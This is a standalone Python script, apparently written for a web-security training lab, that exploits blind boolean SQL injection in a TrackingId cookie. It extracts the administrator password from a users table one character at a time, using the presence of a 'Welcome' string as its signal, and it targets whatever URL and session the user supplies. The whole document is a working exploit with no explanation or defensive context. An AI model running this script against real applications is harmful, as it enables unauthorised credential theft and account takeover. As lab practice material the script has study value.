import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def sqli_password(url, trackingId, session):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where " \
                           "username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': trackingId + sqli_payload_encoded, 'session': session}
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


def main():
    url = input("Enter url: ")
    trackingId = input("Enter TrackingId: ")
    session = input("Enter session: ")
    print("(+) Retrieving administrator password...")
    sqli_password(url, trackingId, session)


if __name__ == "__main__":
    main()
